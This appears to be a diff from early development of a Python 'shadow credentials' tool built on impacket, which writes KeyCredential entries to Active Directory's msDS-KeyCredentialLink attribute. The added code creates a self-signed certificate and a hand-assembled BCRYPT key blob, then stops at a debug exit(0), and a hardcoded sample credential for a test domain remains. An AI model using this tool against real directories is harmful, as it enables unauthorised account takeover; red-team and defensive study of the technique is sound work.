@@ -10,6 +10,9 @@ import random
 import string
 from binascii import unhexlify
 from enum import Enum
+
+import OpenSSL
+from Cryptodome.Util.number import long_to_bytes
 from impacket.examples import logger, utils
 from impacket import version
 from impacket.ldap import ldaptypes
@@ -32,6 +35,7 @@ import struct
 import sys
 import time
 import traceback
+from Cryptodome.PublicKey import RSA
 # todo : fix along with pydsinternal import fix
 from pydsinternals.common.data.DNWithBinary import DNWithBinary
 from pydsinternals.common.data.KeyCredential import KeyCredential
@@ -267,9 +271,52 @@ class ShadowCredentials(object):
         else:
             logging.info("Target user found: %s" % result[0])
         logging.info("Generating certificate")
-        cert = "blahblah"
+        # create rsa key pair object
+        key = OpenSSL.crypto.PKey()
+        # generate key pair or 2048 of length
+        key.generate_key(OpenSSL.crypto.TYPE_RSA, 2048)
+        # create x509 certificate object
+        cert = OpenSSL.crypto.X509()
+
+        # set cert params
+        # cert.set_subject("CN=%s" % self.target_samname)
+        cert.get_subject().CN = self.target_samname
+        # cert.set_issuer("CN=%s" % self.target_samname)
+        cert.set_issuer(cert.get_subject())
+        cert.gmtime_adj_notBefore(0)
+        cert.gmtime_adj_notAfter(365 * 24 * 60 * 60)
+        cert.set_pubkey(key)
+        # self-sign certificate with SHA256 digest and PKCS1 padding scheme
+        cert.sign(key, 'sha512')
+
+        # Create a PKCS12 container
+        # pk = OpenSSL.crypto.PKCS12()
+        # pk.set_certificate(cert)
+        # pk.export()
+
+
+        # Preparing export to bcrypt
+        pubkey = RSA.importKey(OpenSSL.crypto.dump_publickey(OpenSSL.crypto.FILETYPE_PEM, key))
+        Magic = b"RSA1"
+        BitLength = struct.pack("<I", key.bits())
+        cbPublicExp = struct.pack("<I", len(long_to_bytes(pubkey.e)))
+        cbModulus = struct.pack("<I", len(long_to_bytes(pubkey.n)))
+        # todo : temporaire, pour correspondre aux keycredentials
+        cbPrime1 = struct.pack("<I", 0)
+        cbPrime2 = struct.pack("<I", 0)
+        # todo : il manque 3 bytes dans le header (\x01\x00\x01) je sais pas pourquoi
+        idontknowwhatthisis = b"\x01\x00\x01"
+        bcryptheader = Magic + BitLength + cbPublicExp + cbModulus + cbPrime1 + cbPrime2 + idontknowwhatthisis
+        brcryptdata = bcryptheader + OpenSSL.crypto.dump_publickey(OpenSSL.crypto.FILETYPE_ASN1, key)[33:-5]
+        print(brcryptdata)
+
+
         logging.info("Certificate generated")
         logging.info("Generating KeyCredential")
+
+        exit(0)
+        kc = KeyCredential()
+
         kc = b'B:828:000200002000010931771AA15D0D2C55F90085364F9105A8FF8EF5F7D29EAFB68D25FE9327BAA42000029B7190E48CCBF5985D4C9775B1CFB56BE4153CA99CE4DEE6AC4943EEEC5A86DD1B0103525341310008000003000000000100000000000000000000010001BC8830BAB8E09BF812656E00FA7EEB4D83CF710EB072C4F19F540537CD51756720537BFD157238E92567B68D68AD548758324FBA1FDEE0AA08D3ED9963D03EF9BB4BB8CB9158D7AA767F6BCF52912BDD7FA5C4D3EDBAB481885DC9F0F46C1AF79554128C103869DAFA0847229F59543A2F8AEAF538F30C5634C1B6C87F9F8CCD2E79241503C7754D23E66DA6BAF97CBD3BD4B7964D5FB7EAFEA70B8BB1AF9DB77319F6F9CF0EEBE16AF878A1038BF75CBC73B2E20D4A9F48D64236921D997924DD59E8951F9F6B3A813CEF78D8D386CD9FE1704E0A44F88F5E90265C07F0733143E173CBD4165E890F3B8AC533BF0A8BEBE66560BDB996C408472A33C9E2F87101000401010005001000061D1CC264E8B1894CB93691CFB32548CF0200070100080008ECFFF45A0F7FD701080009ECFFF45A0F7FD701:CN=user2,CN=Users,DC=domain,DC=local'
         logging.info("KeyCredential generated with DevideID: %s" % "BLAHBLAHBLAH <3")
         self.ldap_session.search(result[0], '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
@@ -542,6 +589,7 @@ def main():
             shadowcreds.remove(args.device_id)
         elif args.action == 'clear':
             shadowcreds.clear()
+        # todo : add an "info" that will print all information of a keycredential given its deviceid, kind of kc.show() Impacket compliant
     except Exception as e:
         if logging.getLogger().level == logging.DEBUG:
             traceback.print_exc()
